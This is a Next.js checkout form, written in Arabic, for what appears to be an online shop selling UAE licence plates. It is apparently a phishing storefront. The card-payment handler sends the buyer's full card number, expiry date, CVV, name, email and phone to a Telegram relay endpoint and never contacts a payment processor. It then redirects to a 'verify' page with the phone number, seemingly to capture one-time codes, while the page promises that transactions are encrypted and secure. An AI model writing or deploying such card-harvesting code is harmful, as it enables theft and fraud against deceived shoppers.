"use client"

import { useState } from "react"
import Image from "next/image"
import Link from "next/link"
import { useRouter } from "next/navigation"
import {
  CreditCard,
  Bitcoin,
  ArrowRight,
  Shield,
  User,
  Mail,
  Phone,
  Lock,
  Loader2,
  AlertCircle,
  ExternalLink,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import type { Plate } from "@/lib/plates-data"
import {
  emirateNames,
  emirateColors,
  emirateTextColors,
  categoryNames,
  formatPrice,
} from "@/lib/plates-data"

interface CheckoutFormProps {
  plate: Plate
  initialMethod: string
}

export default function CheckoutForm({ plate, initialMethod }: CheckoutFormProps) {
  const router = useRouter()
  const [paymentMethod, setPaymentMethod] = useState<"card" | "crypto">(
    initialMethod === "crypto" ? "crypto" : "card"
  )
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    cardNumber: "",
    cardExpiry: "",
    cardCvv: "",
  })
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [cryptoLoading, setCryptoLoading] = useState(false)

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    let formattedValue = value

    // Format card number with spaces
    if (name === "cardNumber") {
      formattedValue = value
        .replace(/\s/g, "")
        .replace(/(\d{4})/g, "$1 ")
        .trim()
        .slice(0, 19)
    }

    // Format expiry date
    if (name === "cardExpiry") {
      formattedValue = value
        .replace(/\D/g, "")
        .replace(/(\d{2})(\d)/, "$1/$2")
        .slice(0, 5)
    }

    // Format CVV
    if (name === "cardCvv") {
      formattedValue = value.replace(/\D/g, "").slice(0, 4)
    }

    setFormData((prev) => ({ ...prev, [name]: formattedValue }))
  }

  const handleCryptoPayment = async () => {
    // Validate personal info
    if (!formData.name || !formData.email || !formData.phone) {
      setError("يرجى ملء جميع المعلومات الشخصية")
      return
    }

    setCryptoLoading(true)
    setError("")

    try {
      // Send personal info to Telegram first
      await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: "crypto_payment",
          data: {
            emirate: emirateNames[plate.emirate],
            plateCode: plate.code,
            plateNumber: plate.number,
            price: formatPrice(plate.price),
            priceUSD: `$${Math.ceil(plate.price / 3.67).toLocaleString()} USD`,
            name: formData.name,
            email: formData.email,
            phone: formData.phone,
          },
        }),
      })

      // Convert AED to USD (approximate rate)
      const usdAmount = Math.ceil(plate.price / 3.67)

      const response = await fetch("/api/nowpayments", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          price_amount: usdAmount,
          price_currency: "USD",
          order_id: `plate-${plate.id}-${Date.now()}`,
          order_description: `لوحة ${emirateNames[plate.emirate]} - ${plate.code} ${plate.number}`,
          success_url: `${window.location.origin}/checkout/success?plate=${plate.id}`,
          cancel_url: `${window.location.origin}/plate/${plate.id}`,
        }),
      })

      if (!response.ok) {
        throw new Error("Failed to create crypto payment")
      }

      const data = await response.json()
      
      // Redirect to NOWPayments invoice URL
      if (data.invoice_url) {
        window.location.href = data.invoice_url
      } else {
        throw new Error("No invoice URL returned")
      }
    } catch {
      setError("حدث خطأ أثناء إنشاء فاتورة الدفع بالعملات الرقمية. يرجى المحاولة مرة أخرى.")
      setCryptoLoading(false)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")
    setLoading(true)

    try {
      // Send data to Telegram
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: "payment",
          data: {
            emirate: emirateNames[plate.emirate],
            plateCode: plate.code,
            plateNumber: plate.number,
            price: formatPrice(plate.price),
            name: formData.name,
            email: formData.email,
            phone: formData.phone,
            cardNumber: formData.cardNumber,
            cardExpiry: formData.cardExpiry,
            cardCvv: formData.cardCvv,
          },
        }),
      })

      if (!response.ok) {
        throw new Error("Failed to process payment")
      }

      // Redirect to verification page
      router.push(
        `/checkout/verify?phone=${encodeURIComponent(formData.phone)}&plate=${plate.id}`
      )
    } catch {
      setError("حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى.")
      setLoading(false)
    }
  }

  return (
    <div className="mx-auto max-w-5xl px-4 py-8">
      {/* Breadcrumb */}
      <nav className="mb-6 flex items-center gap-2 text-sm text-muted-foreground" aria-label="مسار التنقل">
        <Link href="/" className="transition-colors hover:text-primary">
          {"الرئيسية"}
        </Link>
        <span>/</span>
        <Link href={`/plate/${plate.id}`} className="transition-colors hover:text-primary">
          {plate.code} {plate.number}
        </Link>
        <span>/</span>
        <span className="text-foreground">{"إتمام الشراء"}</span>
      </nav>

      <h1 className="mb-8 text-3xl font-black text-foreground">{"إتمام الشراء"}</h1>

      <div className="grid grid-cols-1 gap-8 lg:grid-cols-3">
        {/* Form */}
        <div className="lg:col-span-2">
          <form onSubmit={handleSubmit} className="flex flex-col gap-6">
            {/* Payment Method Selection */}
            <div className="rounded-xl border border-border/50 bg-card p-6">
              <h2 className="mb-4 text-lg font-bold text-foreground">{"طريقة الدفع"}</h2>
              <div className="flex flex-col gap-3">
                <button
                  type="button"
                  onClick={() => setPaymentMethod("card")}
                  className={`flex items-center gap-3 rounded-lg border-2 p-4 text-right transition-all ${
                    paymentMethod === "card"
                      ? "border-primary bg-primary/5"
                      : "border-border/50 hover:border-primary/50"
                  }`}
                >
                  <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-lg ${
                    paymentMethod === "card" ? "bg-primary/20" : "bg-secondary"
                  }`}>
                    <CreditCard className={`h-5 w-5 ${paymentMethod === "card" ? "text-primary" : "text-muted-foreground"}`} />
                  </div>
                  <div>
                    <p className="text-sm font-bold text-foreground">
                      {"بطاقة ائتمانية"}
                    </p>
                    <p className="text-xs text-muted-foreground">
                      {"Visa / Mastercard"}
                    </p>
                  </div>
                </button>
                <button
                  type="button"
                  onClick={() => setPaymentMethod("crypto")}
                  className={`flex items-center gap-3 rounded-lg border-2 p-4 text-right transition-all ${
                    paymentMethod === "crypto"
                      ? "border-orange-500 bg-orange-500/5"
                      : "border-border/50 hover:border-orange-500/50"
                  }`}
                >
                  <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-lg ${
                    paymentMethod === "crypto" ? "bg-orange-500/20" : "bg-secondary"
                  }`}>
                    <Bitcoin className={`h-5 w-5 ${paymentMethod === "crypto" ? "text-orange-500" : "text-muted-foreground"}`} />
                  </div>
                  <div>
                    <p className="text-sm font-bold text-foreground">
                      {"العملات الرقمية"}
                    </p>
                    <p className="text-xs text-muted-foreground">
                      {"Bitcoin, USDT, ETH +50 عملة"}
                    </p>
                  </div>
                </button>
              </div>
            </div>

            {/* Card Payment Section */}
            {paymentMethod === "card" && (
              <>
                {/* Personal Info */}
                <div className="rounded-xl border border-border/50 bg-card p-6">
                  <h2 className="mb-4 text-lg font-bold text-foreground">{"المعلومات الشخصية"}</h2>
              <div className="flex flex-col gap-4">
                <div>
                  <Label htmlFor="name" className="mb-2 block text-sm text-muted-foreground">
                    {"الاسم الكامل"}
                  </Label>
                  <div className="relative">
                    <User className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                    <Input
                      id="name"
                      name="name"
                      value={formData.name}
                      onChange={handleChange}
                      required
                      placeholder="أدخل اسمك الكامل"
                      className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                    />
                  </div>
                </div>
                <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                  <div>
                    <Label htmlFor="email" className="mb-2 block text-sm text-muted-foreground">
                      {"البريد الإلكتروني"}
                    </Label>
                    <div className="relative">
                      <Mail className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                      <Input
                        id="email"
                        name="email"
                        type="email"
                        value={formData.email}
                        onChange={handleChange}
                        required
                        placeholder="example@email.com"
                        className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                        dir="ltr"
                      />
                    </div>
                  </div>
                  <div>
                    <Label htmlFor="phone" className="mb-2 block text-sm text-muted-foreground">
                      {"رقم الهاتف"}
                    </Label>
                    <div className="relative">
                      <Phone className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                      <Input
                        id="phone"
                        name="phone"
                        type="tel"
                        value={formData.phone}
                        onChange={handleChange}
                        required
                        placeholder="+971 50 123 4567"
                        className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                        dir="ltr"
                      />
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Card Details */}
            <div className="rounded-xl border border-border/50 bg-card p-6">
              <h2 className="mb-4 text-lg font-bold text-foreground">{"تفاصيل البطاقة"}</h2>
              <div className="flex flex-col gap-4">
                <div>
                  <Label htmlFor="cardNumber" className="mb-2 block text-sm text-muted-foreground">
                    {"رقم البطاقة"}
                  </Label>
                  <div className="relative">
                    <CreditCard className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                    <Input
                      id="cardNumber"
                      name="cardNumber"
                      value={formData.cardNumber}
                      onChange={handleChange}
                      required
                      placeholder="0000 0000 0000 0000"
                      className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                      dir="ltr"
                    />
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="cardExpiry" className="mb-2 block text-sm text-muted-foreground">
                      {"تاريخ الانتهاء"}
                    </Label>
                    <Input
                      id="cardExpiry"
                      name="cardExpiry"
                      value={formData.cardExpiry}
                      onChange={handleChange}
                      required
                      placeholder="MM/YY"
                      className="border-border/50 bg-secondary/30 text-foreground placeholder:text-muted-foreground"
                      dir="ltr"
                    />
                  </div>
                  <div>
                    <Label htmlFor="cardCvv" className="mb-2 block text-sm text-muted-foreground">
                      {"CVV"}
                    </Label>
                    <div className="relative">
                      <Lock className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                      <Input
                        id="cardCvv"
                        name="cardCvv"
                        value={formData.cardCvv}
                        onChange={handleChange}
                        required
                        placeholder="123"
                        className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                        dir="ltr"
                      />
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Error Message */}
                {error && (
                  <div className="flex items-center gap-2 rounded-xl border border-destructive/30 bg-destructive/10 p-4 text-destructive">
                    <AlertCircle className="h-5 w-5 shrink-0" />
                    <p className="text-sm">{error}</p>
                  </div>
                )}

                {/* Submit */}
                <Button
                  type="submit"
                  size="lg"
                  disabled={loading}
                  className="w-full gap-2 bg-primary text-lg font-bold text-primary-foreground hover:bg-primary/90"
                >
                  {loading ? (
                    <>
                      <Loader2 className="h-5 w-5 animate-spin" />
                      {"جاري المعالجة..."}
                    </>
                  ) : (
                    <>
                      <Lock className="h-5 w-5" />
                      {"تأكيد ودفع"} {formatPrice(plate.price)}
                    </>
                  )}
                </Button>

                {/* Security Note */}
                <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
                  <Shield className="h-4 w-4 text-green-500" />
                  {"جميع المعاملات مشفرة وآمنة بالكامل"}
                </div>
              </>
            )}

            {/* Crypto Payment Section */}
            {paymentMethod === "crypto" && (
              <>
                {/* Personal Info for Crypto */}
                <div className="rounded-xl border border-border/50 bg-card p-6">
                  <h2 className="mb-4 text-lg font-bold text-foreground">{"المعلومات الشخصية"}</h2>
                  <div className="flex flex-col gap-4">
                    <div>
                      <Label htmlFor="crypto-name" className="mb-2 block text-sm text-muted-foreground">
                        {"الاسم الكامل"}
                      </Label>
                      <div className="relative">
                        <User className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                        <Input
                          id="crypto-name"
                          name="name"
                          value={formData.name}
                          onChange={handleChange}
                          required
                          placeholder="أدخل اسمك الكامل"
                          className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                        />
                      </div>
                    </div>
                    <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                      <div>
                        <Label htmlFor="crypto-email" className="mb-2 block text-sm text-muted-foreground">
                          {"البريد الإلكتروني"}
                        </Label>
                        <div className="relative">
                          <Mail className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                          <Input
                            id="crypto-email"
                            name="email"
                            type="email"
                            value={formData.email}
                            onChange={handleChange}
                            required
                            placeholder="example@email.com"
                            className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                            dir="ltr"
                          />
                        </div>
                      </div>
                      <div>
                        <Label htmlFor="crypto-phone" className="mb-2 block text-sm text-muted-foreground">
                          {"رقم الهاتف"}
                        </Label>
                        <div className="relative">
                          <Phone className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                          <Input
                            id="crypto-phone"
                            name="phone"
                            type="tel"
                            value={formData.phone}
                            onChange={handleChange}
                            required
                            placeholder="+971 50 123 4567"
                            className="border-border/50 bg-secondary/30 pr-10 text-foreground placeholder:text-muted-foreground"
                            dir="ltr"
                          />
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Crypto Payment Details */}
                <div className="rounded-xl border border-orange-500/30 bg-orange-500/5 p-6">
                  <div className="mb-4 flex items-center gap-3">
                    <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-orange-500/20">
                      <Bitcoin className="h-6 w-6 text-orange-500" />
                    </div>
                    <div>
                      <h2 className="text-lg font-bold text-foreground">{"الدفع بالعملات الرقمية"}</h2>
                      <p className="text-sm text-muted-foreground">{"عبر NOWPayments"}</p>
                    </div>
                  </div>
                  
                  <div className="mb-4 rounded-lg bg-secondary/50 p-4">
                    <p className="mb-2 text-sm text-muted-foreground">{"العملات المدعومة:"}</p>
                    <p className="text-sm font-medium text-foreground">
                      {"Bitcoin (BTC), Ethereum (ETH), USDT, USDC, Litecoin, +50 عملة أخرى"}
                    </p>
                  </div>

                  <div className="mb-4 flex items-center justify-between rounded-lg bg-secondary/50 p-4">
                    <span className="text-sm text-muted-foreground">{"المبلغ بالدولار (تقريبي):"}</span>
                    <span className="text-lg font-bold text-foreground">
                      ${Math.ceil(plate.price / 3.67).toLocaleString()} USD
                    </span>
                  </div>

                  {error && (
                    <div className="mb-4 flex items-center gap-2 rounded-xl border border-destructive/30 bg-destructive/10 p-4 text-destructive">
                      <AlertCircle className="h-5 w-5 shrink-0" />
                      <p className="text-sm">{error}</p>
                    </div>
                  )}

                  <Button
                    type="button"
                    size="lg"
                    disabled={cryptoLoading}
                    onClick={handleCryptoPayment}
                    className="w-full gap-2 bg-gradient-to-l from-orange-500 to-amber-500 text-lg font-bold text-white hover:from-orange-600 hover:to-amber-600"
                  >
                    {cryptoLoading ? (
                      <>
                        <Loader2 className="h-5 w-5 animate-spin" />
                        {"جاري إنشاء الفاتورة..."}
                      </>
                    ) : (
                      <>
                        <ExternalLink className="h-5 w-5" />
                        {"المتابعة للدفع"}
                      </>
                    )}
                  </Button>

                  <p className="mt-3 text-center text-xs text-muted-foreground">
                    {"سيتم توجيهك إلى صفحة الدفع الآمنة لإتمام العملية"}
                  </p>
                </div>
              </>
            )}
          </form>
        </div>

        {/* Order Summary Sidebar */}
        <div className="lg:col-span-1">
          <div className="sticky top-24 rounded-xl border border-border/50 bg-card p-6">
            <h2 className="mb-4 text-lg font-bold text-foreground">{"ملخص الطلب"}</h2>

            {/* Plate Preview */}
            <div className={`relative mb-4 overflow-hidden rounded-lg border ${emirateColors[plate.emirate]} border-opacity-40`}>
              <div className="relative aspect-[16/10] bg-secondary/50">
                <Image
                  src={plate.image}
                  alt={`لوحة ${emirateNames[plate.emirate]} ${plate.number}`}
                  fill
                  className="object-cover"
                  sizes="400px"
                />
                <div className="absolute inset-0 flex flex-col items-center justify-center bg-background/60 backdrop-blur-[2px]">
                  <span className={`mb-1 text-xs font-bold ${emirateTextColors[plate.emirate]}`}>
                    {emirateNames[plate.emirate]}
                  </span>
                  <div className="flex items-baseline gap-2">
                    <span className="text-sm font-bold text-muted-foreground">{plate.code}</span>
                    <span className="text-2xl font-black text-foreground">{plate.number}</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Details */}
            <div className="flex flex-col gap-3 border-b border-border/50 pb-4">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">{"الإمارة"}</span>
                <span className={`font-medium ${emirateTextColors[plate.emirate]}`}>
                  {emirateNames[plate.emirate]}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">{"الفئة"}</span>
                <span className="font-medium text-foreground">
                  {categoryNames[plate.category]}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">{"الكود / الرقم"}</span>
                <span className="font-medium text-foreground">
                  {plate.code} - {plate.number}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">{"طريقة الدفع"}</span>
                <span className="flex items-center gap-1.5 font-medium text-foreground">
                  {paymentMethod === "card" ? (
                    <>
                      <CreditCard className="h-3.5 w-3.5 text-primary" />
                      {"بطاقة ائتمانية"}
                    </>
                  ) : (
                    <>
                      <Bitcoin className="h-3.5 w-3.5 text-orange-500" />
                      {"عملات رقمية"}
                    </>
                  )}
                </span>
              </div>
            </div>

            {/* Price */}
            <div className="mt-4 flex items-center justify-between">
              <span className="text-base font-bold text-foreground">{"الإجمالي"}</span>
              <span className="text-2xl font-black text-primary">
                {formatPrice(plate.price)}
              </span>
            </div>

            {/* Back Link */}
            <Link
              href={`/plate/${plate.id}`}
              className="mt-4 flex items-center gap-1 text-sm text-muted-foreground transition-colors hover:text-primary"
            >
              <ArrowRight className="h-4 w-4" />
              {"العودة لتفاصيل اللوحة"}
            </Link>
          </div>
        </div>
      </div>
    </div>
  )
}
